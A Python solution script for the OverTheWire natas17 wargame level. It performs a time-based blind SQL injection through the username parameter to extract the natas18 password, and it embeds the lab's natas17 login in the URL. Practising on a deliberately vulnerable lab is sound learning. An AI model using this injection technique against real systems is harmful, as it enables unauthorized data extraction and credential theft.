import requests
possibleChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
address = "http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/index.php"
charsInPass = ""
pwd = ""

for i in range(0, len(possibleChars)):
	
	try: 
		r = requests.get(address+'?username=natas18" AND IF (password LIKE BINARY "%' + possibleChars[i] +'%", SLEEP(5), null) -- ', timeout=1)
	except requests.exceptions.Timeout:
		charsInPass = charsInPass + possibleChars[i]

print("Possible characters in password are: "+charsInPass)
for i in range(0, 32):
	for j in range(0, len(charsInPass)):
		try:
			r = requests.get(address+'?username=natas18" AND IF (password LIKE BINARY "' + pwd + charsInPass[j] +'%", SLEEP(5), null) -- ', timeout=1)
		except requests.exceptions.Timeout:
			pwd = pwd + charsInPass[j]
			print(pwd)
			break	
			
print("Password found! It's "+pwd)
